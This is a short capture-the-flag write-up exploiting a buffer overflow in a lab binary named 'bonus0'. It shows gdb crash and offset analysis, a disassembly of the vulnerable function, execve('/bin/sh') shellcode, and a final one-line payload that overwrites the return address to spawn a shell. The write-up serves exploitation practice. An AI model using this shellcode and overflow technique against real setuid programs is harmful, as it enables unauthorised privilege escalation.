```
    (gdb) run
    Starting program: /home/user/bonus0/bonus0 
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

    Program received signal SIGSEGV, Segmentation fault.
    0x41336141 in ?? ()
    (gdb) r
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /home/user/bonus0/bonus0 
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa
    - 
    6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A��� 6Aa7Aa8Aa9Ab0Ab1Ab2A���

    Program received signal SIGSEGV, Segmentation fault.
    0x30624139 in ?? ()
```

we have a segmentation fault in 0x41336141 so the ofsset is 29



```
    (gdb) b p
    Breakpoint 1 at 0x80484bd
    (gdb) r
    Starting program: /home/user/bonus0/bonus0 

    Breakpoint 1, 0x080484bd in p ()
    (gdb) disas p
    Dump of assembler code for function p:
    0x080484b4 <+0>:     push   ebp
    0x080484b5 <+1>:     mov    ebp,esp
    0x080484b7 <+3>:     sub    esp,0x1018
    => 0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc]
    0x080484c0 <+12>:    mov    DWORD PTR [esp],eax
    0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
    0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
    0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
    0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
    0x080484da <+38>:    mov    DWORD PTR [esp],0x0
    0x080484e1 <+45>:    call   0x8048380 <read@plt>
    0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
    0x080484ee <+58>:    lea    eax,[ebp-0x1008]
    0x080484f4 <+64>:    mov    DWORD PTR [esp],eax
    0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
    0x080484fc <+72>:    mov    BYTE PTR [eax],0x0
    0x080484ff <+75>:    lea    eax,[ebp-0x1008]
    0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
    0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
    0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8]
    0x08048514 <+96>:    mov    DWORD PTR [esp],eax
    0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
    0x0804851c <+104>:   leave  
    0x0804851d <+105>:   ret    
    End of assembler dump.
    (gdb) x ebp-0x1008
    No symbol table is loaded.  Use the "file" command.
    (gdb) x $ebp-0x1008
    0xbfffe680:     0x00000000
    (gdb) x/40wx $ebp-0x1008
    0xbfffe680:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe690:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6a0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6b0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6c0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6d0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6e0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6f0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe700:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
    (gdb) ni
    0x080484c0 in p ()
    (gdb) nu
    Undefined command: "nu".  Try "help".
    (gdb) ni
    0x080484c3 in p ()
    (gdb) ni
    - 
    0x080484c8 in p ()
    (gdb) ni
    0x080484d0 in p ()
    (gdb) ni
    0x080484d6 in p ()
    (gdb) ni
    0x080484da in p ()
    (gdb) ni
    0x080484e1 in p ()
    (gdb) ni
    AAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB
    0x080484e6 in p ()
    (gdb) x/40wx $ebp-0x1008
    0xbfffe680:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbfffe690:     0x41414141      0x42414141      0x42424242      0x42424242
    0xbfffe6a0:     0x42424242      0x42424242      0x42424242      0x00000a42
    0xbfffe6b0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6c0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6d0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6e0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6f0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe700:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
```

This 0xbfffe680 is the address where the program will continue after returning from pp().
the return address is => 0xbfffe680 => \x80\xe6\xff\xbf

```
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

 export code=$(python -c 'print("\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68" "\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')


```
    (gdb) start
    Temporary breakpoint 1 at 0x80485a7
    Starting program: /home/user/bonus0/bonus0 

    Temporary breakpoint 1, 0x080485a7 in main ()
    (gdb) p/x getenv("code")
    $1 = 0xbfffff47
```

(python -c 'print("A"*29 + "\x80\xe6\xff\xbf" + "\x90"* 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'; cat) | ./bonus0
